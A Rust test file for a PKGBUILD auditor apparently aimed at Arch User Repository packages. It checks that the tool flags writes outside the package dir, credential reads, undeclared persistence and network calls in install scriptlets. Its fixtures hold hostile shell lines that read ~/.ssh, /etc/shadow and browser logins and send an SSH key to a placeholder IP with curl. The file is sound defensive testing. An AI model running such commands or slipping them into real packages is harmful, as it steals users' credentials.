// SPDX-License-Identifier: GPL-2.0-or-later
//! One row per law, broken and kept. Addresses are from the documentation ranges: nothing is fetched.
use aurlaws::{LawId as L, audit_text};

const SUM: &str = "0000000000000000000000000000000000000000000000000000000000000000";

fn pkg(body: &str) -> String {
    format!(
        "pkgname=demo\npkgver=1.0\npkgrel=1\narch=(any)\nurl=https://example.org/demo\n{body}\n"
    )
}

fn laws(pkgbuild: &str, install: Option<&str>) -> Vec<L> {
    let r = audit_text(pkgbuild, install);
    let mut v: Vec<L> = r.findings.iter().map(|f| f.law).collect();
    v.sort();
    v.dedup();
    v
}

#[test]
fn writes_stay_in_the_package() {
    assert_eq!(
        laws(
            &pkg("package() { install -Dm755 demo /usr/bin/demo; }"),
            None
        ),
        [L::WriteOutsidePackage]
    );
    assert_eq!(
        laws(&pkg("build() { echo x > /etc/demo.conf; }"), None),
        [L::WriteOutsidePackage]
    );
    assert_eq!(
        laws(
            &pkg("package() { install -Dm755 demo \"$pkgdir/usr/bin/demo\"; }"),
            None
        ),
        []
    );
    assert_eq!(
        laws(
            &pkg("build() { echo x > \"$srcdir/out\"; mkdir -p build; }"),
            None
        ),
        []
    );
    assert_eq!(
        laws(
            &pkg("build() { echo x > /tmp/scratch; echo y > /dev/null; }"),
            None
        ),
        []
    );
}

#[test]
fn credentials_are_not_read() {
    for p in [
        "~/.ssh/id_rsa",
        "$HOME/.gnupg/secring.gpg",
        "$HOME/.mozilla/firefox/x/logins.json",
        "$HOME/.config/google-chrome/Default/Login\\ Data",
        "$HOME/.aws/credentials",
        "/etc/shadow",
    ] {
        assert_eq!(
            laws(&pkg(&format!("build() {{ cat {p} > /dev/null; }}")), None),
            [L::ReadCredentials],
            "{p}"
        );
    }
    assert_eq!(laws(&pkg("build() { cat README > /dev/null; }"), None), []);
}

#[test]
fn credentials_do_not_reach_the_network() {
    let got = laws(
        &pkg("build() { tar czf /tmp/k.tgz ~/.ssh; curl -T /tmp/k.tgz http://203.0.113.9/up; }"),
        None,
    );
    assert!(got.contains(&L::CredentialToNetwork), "{got:?}");
    let got = laws(
        &pkg("build() { curl \"http://203.0.113.9/?k=$(cat ~/.ssh/id_rsa)\"; }"),
        None,
    );
    assert!(got.contains(&L::CredentialToNetwork), "{got:?}");
}

#[test]
fn scriptlets_touch_only_declared_files() {
    let body = "package() { install -Dm644 demo.conf \"$pkgdir/etc/demo/demo.conf\"; }";
    let keep = "post_install() { chown root /etc/demo/demo.conf; ldconfig; }\n";
    assert_eq!(laws(&pkg(body), Some(keep)), []);
    let bad = "post_install() { echo x >> /etc/passwd; }\n";
    assert_eq!(laws(&pkg(body), Some(bad)), [L::ScriptletUndeclaredFile]);
}

#[test]
fn sources_stay_on_the_declared_host() {
    let bad = format!("source=(https://evil.example.net/demo.tar.gz)\nsha256sums=({SUM})");
    assert_eq!(laws(&pkg(&bad), None), [L::SourceOffUpstream]);
    let good = format!("source=(https://dl.example.org/demo.tar.gz)\nsha256sums=({SUM})");
    assert_eq!(laws(&pkg(&good), None), []);
    let mirror =
        format!("source=(https://files.pythonhosted.org/packages/demo.tar.gz)\nsha256sums=({SUM})");
    assert_eq!(laws(&pkg(&mirror), None), []);
    let local = "source=(demo.desktop)\nsha256sums=(SKIP)";
    assert_eq!(laws(&pkg(local), None), []);
}

#[test]
fn persistence_must_be_declared() {
    assert_eq!(
        laws(
            &pkg(""),
            Some("post_install() { systemctl enable --now demo.service; }\n")
        ),
        [L::UndeclaredPersistence]
    );
    assert!(
        laws(&pkg("build() { echo x >> ~/.bashrc; }"), None).contains(&L::UndeclaredPersistence)
    );
    assert!(
        laws(
            &pkg("package() { echo '* * * * * x' > \"$pkgdir/etc/cron.d/demo\"; }"),
            None
        )
        .contains(&L::UndeclaredPersistence)
    );
    // A unit the package lists and ships is declared, and stays off until someone enables it.
    let shipped = format!(
        "source=(demo.service)\nsha256sums=({SUM})\npackage() {{ install -Dm644 demo.service \"$pkgdir/usr/lib/systemd/system/demo.service\"; }}"
    );
    assert_eq!(laws(&pkg(&shipped), None), []);
}

#[test]
fn postinstall_stays_off_the_network() {
    let got = laws(
        &pkg(""),
        Some("post_install() { curl -o /dev/null http://203.0.113.9/ping; }\n"),
    );
    assert!(got.contains(&L::PostinstallNetwork), "{got:?}");
    assert_eq!(laws(&pkg(""), Some("post_install() { echo hello; }\n")), []);
}

#[test]
fn bin_packages_need_a_checksum() {
    let bad = "pkgname=demo-bin\npkgver=1\npkgrel=1\narch=(x86_64)\nurl=https://example.org\nsource=(https://example.org/demo)\nsha256sums=(SKIP)\n";
    assert_eq!(laws(bad, None), [L::BinChecksumUpstream]);
    let good = format!(
        "pkgname=demo-bin\npkgver=1\npkgrel=1\narch=(x86_64)\nurl=https://example.org\nsource=(https://example.org/demo)\nsha256sums=({SUM})\n"
    );
    assert_eq!(laws(&good, None), []);
}
